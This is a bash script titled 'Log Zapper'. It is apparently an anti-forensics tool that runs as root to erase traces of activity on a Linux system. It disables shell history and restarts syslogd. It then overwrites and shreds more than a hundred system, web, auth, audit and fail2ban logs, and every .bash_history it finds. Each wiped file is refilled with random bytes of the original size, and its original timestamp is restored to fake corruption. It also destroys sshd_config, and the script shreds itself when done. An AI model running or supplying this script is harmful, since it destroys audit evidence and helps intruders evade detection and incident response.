#!/bin/bash

# Verifica si el script está siendo ejecutado como root
if [ "$UID" -ne 0 ]; then
    echo "Este script debe ser ejecutado como root."
    exit 1
fi

 # Colors

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
turquoiseColour="\e[0;36m\033[1m"

 # Intro

echo -e "\n\n  ╔══════════════════════════════════════════════════╗"
echo -e "╔═╝                                                  ╚═╗"
echo -e "║         ${turquoiseColour}Log Zapper: A Secure Zapper For Logs${endColour}         ║"
echo -e "╚═╗                                                  ╔═╝"
echo -e "  ╚══════════════════════════════════════════════════╝  "
echo -e "\n                  ${greenColour}By${endColour} Rug4lo and yoshl"

 # Reset configuration of syslogd daemon

echo -e "\n\n${greenColour}[+] ${endColour}Reseting configuration of syslogd daemon"

killall -HUP syslogd &>/dev/null
echo -e "  ~ Reset complete"

 # Remove of the Environment Variables

echo -e "\n${greenColour}[+] ${endColour}Removing of the Environment Variables"

unset HISTFILE
unset SAVEHIST
export HISTFILE=/dev/null
export SAVEHIST=/dev/null
echo -e "  ~ Remove complete"

 # Creating data for Gutmann Secuence

generate_random_data() {
    head -c 3 /dev/urandom
}

data=(
    "$(generate_random_data)"
    "$(generate_random_data)"
    "$(generate_random_data)"
    "$(generate_random_data)"
    '\x55'
    '\xAA'
    '\x92\x49\x24'
    '\x49\x24\x92'
    '\x24\x92\x49'
    '\x00'
    '\x11'
    '\x22'
    '\x33'
    '\x44'
    '\x55'
    '\x66'
    '\x77'
    '\x88'
    '\x99'
    '\xAA'
    '\xBB'
    '\xCC'
    '\xEE'
    '\xFF'
    '\x92\x49\x24'
    '\x49\x24\x92'
    '\x24\x92\x49'
    '\x6D\x86\xD8'
    '\xD6\xDB\x6D'
    '\xDB\x6D\xB6'
    "$(generate_random_data)"
    "$(generate_random_data)"
    "$(generate_random_data)"
    "$(generate_random_data)"
)

 # Clean common log files

echo -e "\n${greenColour}[+] ${endColour}Deleting common log files"

common_logs=(
  "/etc/httpd/logs/access_log"
  "/etc/httpd/logs/error_log"
  "/etc/lastlog"
  "/etc/mail/access"
  "/etc/ssh/sshd_config"
  "/etc/utmp"
  "/etc/utmpx"
  "/etc/wtmp"
  "/etc/wtmpx"
  "/root/.Xauthority"
  "/root/.bash_history"
  "/root/.bash_logout"
  "/root/.bash_logut"
  "/root/.cshrc"
  "/root/.ksh_history"
  "/root/.tcshrc"
  "/tmp"
  "/tmp/logs"
  "/usr/adm/lastlog"
  "/usr/adm/utmp"
  "/usr/adm/utmpx"
  "/usr/adm/wtmp"
  "/usr/adm/wtmpx"
  "/usr/local/apache/log"
  "/usr/local/apache/logs"
  "/usr/local/www/logs/thttpd_log"
  "/var/account/acct"
  "/var/adm"
  "/var/adm/lastlog"
  "/var/adm/pacct"
  "/var/adm/ssh.log"
  "/var/adm/utmp"
  "/var/adm/utmpx"
  "/var/adm/wtmp"
  "/var/adm/wtmpx"
  "/var/apache/log"
  "/var/apache/logs"
  "/var/httpd/logs/ssl.log"
  "/var/lock/samba"
  "/var/log"
  "/var/log/Xorg"
  "/var/log/Xorg.0.log"
  "/var/log/acct"
  "/var/log/alerts.log"
  "/var/log/alternatives"
  "/var/log/alternatives.log"
  "/var/log/apache2/acces.log"
  "/var/log/apache2/acces.log1"
  "/var/log/apache2/access.log"
  "/var/log/apache2/error.log"
  "/var/log/apt/history.log"
  "/var/log/apt/term.log"
  "/var/log/audit/audit.log"
  "/var/log/auth"
  "/var/log/auth.log"
  "/var/log/boot.log"
  "/var/log/btmp"
  "/var/log/cgi.log"
  "/var/log/clamav/clamav.log"
  "/var/log/cron"
  "/var/log/cron.log"
  "/var/log/cups"
  "/var/log/daemon"
  "/var/log/daemon.log"
  "/var/log/dmesg"
  "/var/log/dpkg"
  "/var/log/dpkg.log"
  "/var/log/daemon.log"
  "/var/log/fail2ban.log"
  "/var/log/faillog"
  "/var/log/httpd/access_log"
  "/var/log/httpd/error_log"
  "/var/log/httpsd/ssl.access_log"
  "/var/log/httpsd/ssl_log"
  "/var/log/kern"
  "/var/log/kern.log"
  "/var/log/lastlog"
  "/var/log/lighttpd/access.log"
  "/var/log/lighttpd/error.log"
  "/var/log/loginlog"
  "/var/log/logname"
  "/var/log/lpr.log"
  "/var/log/mail.err"
  "/var/log/mail.log"
  "/var/log/mail.warn"
  "/var/log/maillog"
  "/var/log/mariadb/mariadb-error.log"
  "/var/log/mariadb/mariadb.log"
  "/var/log/memcached.log"
  "/var/log/messages"
  "/var/log/messages/"
  "/var/log/mongodb/mongod.log"
  "/var/log/mysql/error.log"
  "/var/log/ncftpd.errs"
  "/var/log/ncftpd/misclog.txt"
  "/var/log/nctfpd.errs"
  "/var/log/news"
  "/var/log/news.all"
  "/var/log/news/news"
  "/var/log/news/news.all"
  "/var/log/news/news.crit"
  "/var/log/news/news.err"
  "/var/log/news/news.notice"
  "/var/log/news/suck.err"
  "/var/log/news/suck.notice"
  "/var/log/nginx/php_error.log"
  "/var/log/pacct"
  "/var/log/pacman.log"
  "/var/log/pureftp.log"
  "/var/log/poplog"
  "/var/log/portage/elog/summary.log"
  "/var/log/proftpd.access_log"
  "/var/log/proftpd.xferlog"
  "/var/log/proftpd/xferlog.legacy"
  "/var/log/qmail"
  "/var/log/redis/redis-server.log"
  "/var/log/rkhunter.log"
  "/var/log/samba"
  "/var/log/samba-log.%m"
  "/var/log/samba.log.%m"
  "/var/log/samba/log.nmbd"
  "/var/log/samba/log.smbd"
  "/var/log/secure"
  "/var/log/secure.log"
  "/var/log/sendmail.log"
  "/var/log/smartd.log"
  "/var/log/smtpd"
  "/var/log/spooler"
  "/var/log/squid/access.log"
  "/var/log/ssh.log"
  "/var/log/syslog"
  "/var/log/syslog.log"
  "/var/log/telnetd"
  "/var/log/tftp.log"
  "/var/log/thttpd_log"
  "/var/log/ufw.log"
  "/var/log/user"
  "/var/log/user.log"
  "/var/log/utmp"
  "/var/log/utmpx"
  "/var/log/vsftpd.log"
  "/var/log/wtmp"
  "/var/log/wtmpx"
  "/var/log/xferlog"
  "/var/log/yum.log"
  "/var/logs"
  "/var/run/utmp"
  "/var/run/utmpx"
  "/var/spool/errors"
  "/var/spool/locks"
  "/var/spool/logs"
  "/var/spool/tmp"
  "/usr/local/psa/admin/logs/httpsd_access_log"

)

for path in "${common_logs[@]}"; do

  # Check if path exists
  if [ -f "$path" ]; then

  # Saving date and size of the file
    bytes=$(du -b $path 2>/dev/null | awk '{print $1}')
    time=$(date -r $path +"%Y%m%d%H%M.%S")
    
    # Overwriting data with Gutmann Secuence
    for pattern in "${data[@]}"; do

    length=$(printf "%s" "$pattern" | wc -c)
      if [ $length -eq 1 ]; then
        printf "$(yes "$pattern" | head -n 21845 | tr -d '\n')" >> "$path"
      else
        printf "$(yes "$pattern" | head -n 65536 | tr -d '\n')" >> "$path"
      fi
    done

    # Overwriting and Deleting with shred
    shred -n 4 -v $path &>/dev/null
    head -c $bytes /dev/urandom > $path
    cp /dev/null $path 2>/dev/null
    shred -zun 7 -v $path &>/dev/null

    # Creating fake corrupted file with same date and size as original
    head -c $bytes /dev/urandom > $path && touch -t "$time" $path

    echo -e "  ~ Removing the log file: ${redColour}$path${endColour}"
  fi
done

sync

 # Clean .log files

echo -e "\n${greenColour}[+] ${endColour}Cleaning .log files"

log1=$(find / -name "*.log" 2>/dev/null)

for path in $log1; do

  # Saving date and size of the file
  bytes=$(du -b $path 2>/dev/null | awk '{print $1}')
  time=$(date -r $path +"%Y%m%d%H%M.%S")

    # Overwriting data with Gutmann Secuence
    for pattern in "${data[@]}"; do

    length=$(printf "%s" "$pattern" | wc -c)
      if [ $length -eq 1 ]; then
        printf "$(yes "$pattern" | head -n 21845 | tr -d '\n')" >> "$path"
      else
        printf "$(yes "$pattern" | head -n 65536 | tr -d '\n')" >> "$path"
      fi
    done

  # Overwriting and Deleting with shred
  shred -n 4 -v $path &>/dev/null
  head -c $bytes /dev/urandom > $path
  cp /dev/null $path 2>/dev/null
  shred -zun 7 -v $path &>/dev/null

  # Creating fake corrupted file with same date and size as original
  head -c $bytes /dev/urandom > $path && touch -t "$time" $path

  echo -e "  ~ Removing the log file: ${redColour}$path${endColour}"
done

sync

 # Clean .log.* files (usualy backups of the logs)

echo -e "\n${greenColour}[+] ${endColour}Cleaning backups of log files"

log1=$(find / -name "*.log.*" 2>/dev/null)

for path in $log1; do

  # Saving date and size of the file
  bytes=$(du -b $path 2>/dev/null | awk '{print $1}')
  time=$(date -r $path +"%Y%m%d%H%M.%S")

    # Overwriting data with Gutmann Secuence
    for pattern in "${data[@]}"; do

    length=$(printf "%s" "$pattern" | wc -c)
      if [ $length -eq 1 ]; then
        printf "$(yes "$pattern" | head -n 21845 | tr -d '\n')" >> "$path"
      else
        printf "$(yes "$pattern" | head -n 65536 | tr -d '\n')" >> "$path"
      fi
    done

  # Overwriting and Deleting with shred
  shred -n 4 -v $path &>/dev/null
  head -c $bytes /dev/urandom > $path
  cp /dev/null $path 2>/dev/null
  shred -zun 7 -v $path &>/dev/null

  # Creating fake corrupted file with same date and size as original
  head -c $bytes /dev/urandom > $path && touch -t "$time" $path

  echo -e "  ~ Removing the log file: ${redColour}$path${endColour}"
done

sync

 # Clean .log_old files

echo -e "\n${greenColour}[+] ${endColour}Cleaning old log files"

log1=$(find / -name "*.log_old" 2>/dev/null)

for path in $log1; do

  # Saving date and size of the file
  bytes=$(du -b $path 2>/dev/null | awk '{print $1}')
  time=$(date -r $path +"%Y%m%d%H%M.%S")

    # Overwriting data with Gutmann Secuence
    for pattern in "${data[@]}"; do

    length=$(printf "%s" "$pattern" | wc -c)
      if [ $length -eq 1 ]; then
        printf "$(yes "$pattern" | head -n 21845 | tr -d '\n')" >> "$path"
      else
        printf "$(yes "$pattern" | head -n 65536 | tr -d '\n')" >> "$path"
      fi
    done

  # Overwriting and Deleting with shred
  shred -n 4 -v $path &>/dev/null
  head -c $bytes /dev/urandom > $path
  cp /dev/null $path 2>/dev/null
  shred -zun 7 -v $path &>/dev/null

  # Creating fake corrupted file with same date and size as original
  head -c $bytes /dev/urandom > $path && touch -t "$time" $path

  echo -e "  ~ Removing the log file: ${redColour}$path${endColour}"
done

sync

 # Clean *log files

echo -e "\n${greenColour}[+] ${endColour}Cleaning other log files"

log2=$(find / -name "log*" -type f 2>/dev/null)

for path in $log2; do

  # Overwriting and Deleting with shred
  bytes=$(du -b $path 2>/dev/null | awk '{print $1}')
  cp /dev/null $path 2>/dev/null
  shred -zun 7 -v $path &>/dev/null 

done

sync
echo -e "  ~ Remove complete"

 # Clean *.bash_logout files

echo -e "\n${greenColour}[+] ${endColour}Cleaning every .bash_logout"

bash_logout=$(find / -name "*.bash_logout" 2>/dev/null)

for path in $bash_logout; do

  # Saving date and size of the file
  bytes=$(du -b $path 2>/dev/null | awk '{print $1}')
  time=$(date -r $path +"%Y%m%d%H%M.%S")

    # Overwriting data with Gutmann Secuence

    for pattern in "${data[@]}"; do

    length=$(printf "%s" "$pattern" | wc -c)
      if [ $length -eq 1 ]; then
        printf "$(yes "$pattern" | head -n 21845 | tr -d '\n')" >> "$path"
      else
        printf "$(yes "$pattern" | head -n 65536 | tr -d '\n')" >> "$path"
       fi
    done

  # Overwriting and Deleting with shred
  shred -n 4 -v $path &>/dev/null
  head -c $bytes /dev/urandom > $path
  cp /dev/null $path 2>/dev/null
  shred -zun 7 -v $path &>/dev/null

  # Creating fake corrupted file with same date and size as original
  head -c $bytes /dev/urandom > $path && touch -t "$time" $path

  echo -e "  ~ Removing the log file: ${redColour}$path${endColour}"
done

sync

 # Clean *.bash_history files

echo -e "\n${greenColour}[+] ${endColour}Cleaning every .bash_history"

bash_history=$(find / -name "*.bash_history" 2>/dev/null)

for path in $bash_history; do

  # Saving date and size of the file
  bytes=$(du -b $path 2>/dev/null | awk '{print $1}')
  time=$(date -r $path +"%Y%m%d%H%M.%S")

    # Overwriting data with Gutmann Secuence

    for pattern in "${data[@]}"; do

    length=$(printf "%s" "$pattern" | wc -c)
      if [ $length -eq 1 ]; then
        printf "$(yes "$pattern" | head -n 21845 | tr -d '\n')" >> "$path"
      else
        printf "$(yes "$pattern" | head -n 65536 | tr -d '\n')" >> "$path"
       fi
    done

  # Overwriting and Deleting with shred
  shred -n 4 -v $path &>/dev/null
  head -c $bytes /dev/urandom > $path
  cp /dev/null $path 2>/dev/null
  shred -zun 7 -v $path &>/dev/null

  # Creating fake corrupted file with same date and size as original
  head -c $bytes /dev/urandom > $path  && touch -t "$time" $path

  echo -e "  ~ Removing the log file: ${redColour}$path${endColour}"
done

sync

 # Delete comand History

echo -e "\n${greenColour}[+] ${endColour}Erasing the command History"

history -c
echo -e "  ~ Erase complete"

echo -e "\n${redColour}[!]${endColour} This script will be deleted, Thanks for using it!\n"

sync

 # Delete this code

shred -zun 15 -v $0 &>/dev/null
